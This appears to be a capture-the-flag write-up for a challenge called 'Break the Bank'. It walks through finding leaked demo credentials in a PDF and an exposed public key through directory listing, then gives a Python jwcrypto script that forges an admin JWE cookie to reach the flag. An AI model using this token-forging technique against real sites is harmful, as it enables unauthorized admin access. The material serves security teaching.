![img](images/Screenshot%202026-03-13%20221531.png)

## Break the Bank

**Step 1 — Recon & Initial Enumeration**

First, open the website.

The page looks like an old **1997-style bank site** called:

*First National Savings Bank*

When doing CTF / pentest, always check:

* Links

* Login pages

* Hidden directories

* Source code

* Robots.txt

* Footer links

*We found a login page:*

/login.html

When logging in, the request sends JSON to:

POST /login

![img](images/Screenshot%202026-03-13%20221547.png)

We also tested:

/admin

   Response:

   302 Redirect → /login.html

So `/admin` needs authentication.

Good, now we know the target.

## **Step 2 — PDF Leak (Information Disclosure)**

Always check footer links.

In the footer we found:

  /resources/FNSB\_InternetBanking\_Guide.pdf

![](images/Screenshot%202026-03-13%20221606.png)

Download it.

![](images/Screenshot%202026-03-13%20221909.png)

Inside the PDF we found:

Demo Account

```
Username: testuser

Password: testpass123
```

This is **information disclosure**.

Login with:

``` testuser / testpass123 ```
![](/images/Screenshot%202026-03-13%20222051.png)

After login, browser receives a cookie:

``` fnsb_token= eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiY……….. ```

This is not normal JWT.

It is **JWE (JSON Web Encryption)**.

Important.

## **Step 3 — Directory Listing Enabled**

Next step → check directory listing.

Try:

/resources/

![](images/Screenshot%202026-03-13%20223821.png)

And boom…

Directory listing is enabled.

We see:

* FNSB_InternetBanking_Guide.pdf  
* memo.txt  
* key.pem

Download memo:

*/resources/memo.txt*

Inside:

* Reminder:

Testing credentials should be reviewed and retired before production.

LOL.

- [ ] Now download:

/resources/key.pem

This is the **RSA public key**.

This is the biggest mistake.

**Why?**

Because JWE uses public key encryption.

If public key is exposed → attacker can encrypt token.

Server will decrypt with private key.

Game over.

# **Step — Check if JWT or JWE**

JWT has 3 parts  
 JWE has 5 parts

Command:

echo "TOKEN" | tr '.' '\\n'

Example:

echo "eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAtMjU2In0……….. | tr '.' '\\n'

You will see 5 lines → JWE

---

# **Decode Header**

First part only:

echo 'eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAtMjU2In0' | base64 \-d

Output:

{"cty":"JWT","enc":"A256GCM","alg":"RSA-OAEP-256"}

Meaning:

| field | meaning |
| :---- | :---- |
| RSA-OAEP-256 | uses RSA public key |
| A256GCM | AES encryption |
| JWE | encrypted token |

  So we must forge   JWE.

![](/images/Screenshot%202026-03-13%20224200.png)

from jwcrypto import jwk, jwe

import json

with open("key.pem","rb") as f:

    key = jwk.JWK.from_pem(f.read())

payload = json.dumps({

    "sub": "admin",

    "iat": 1710000000,

    "exp": 1910000000

})

protected = {

    "alg": "RSA-OAEP-256",

    "enc": "A256GCM",

    "cty": "JWT"

}

token = jwe.JWE(

    payload.encode(),

    protected=protected

)

token.add_recipient(key)

print(token.serialize(compact=True))

## **Step 8 — Send Token to Server**

Open browser devtools.

Go to:

Application → Cookies

Replace cookie:

fnsb_token= <FORGED_TOKEN>

## **Step 9 — Admin Access**

Now open:

/admin

Server decrypts token → sees:

sub = admin

Access granted.

Admin panel shows:

utflag{s0m3_c00k1es_@re_t@st13r_th@n_0th3rs}

Solved.

![](images/Screenshot%202026-03-13%20224641.png)

